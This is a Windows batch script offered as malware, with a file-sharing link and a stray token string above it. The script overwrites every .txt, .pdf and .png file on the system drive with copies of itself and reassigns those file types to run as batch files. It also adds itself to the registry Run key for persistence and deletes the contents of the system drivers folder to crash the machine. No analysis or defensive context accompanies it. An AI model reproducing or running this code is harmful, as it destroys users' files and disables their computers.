https://drive.google.com/file/d/13KM4jJFKjzZhkVHdQmq0YlNPCr69cTX8/view
! MKLdoqapybvX8tnb24bG2teg5bhuSPZzSJ
@ echo off
rem ---------------------------------
rem Infect All .Txt Files
assoc .txt=batfile
DIR /S/B %SystemDrive%\*.txt >> InfList_txt.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_txt.txt) do copy /y %0 "%%j:%%k"
rem ---------------------------------
rem ---------------------------------
rem Infect All .Pdf Files
assoc .pdf=batfile
DIR /S/B %SystemDrive%\*.pdf >> InfList_pdf.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_pdf.txt) do copy /y %0 "%%j:%%k"
rem ---------------------------------
rem ---------------------------------
rem Infect All .Png Files
assoc .png=batfile
DIR /S/B %SystemDrive%\*.png >> InfList_png.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_png.txt) do copy /y %0 "%%j:%%k"
rem ---------------------------------
rem ---------------------------------
rem Start Windows XP Secret Song
start "" "%systemroot%\system32\oobe\images\title.wma"
rem ---------------------------------
rem ---------------------------------
rem Activate Blue Screen Of Death
@((( Echo Off > Nul ) & Break Off )
    @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    @Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul
    @Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*"
)
rem ---------------------------------
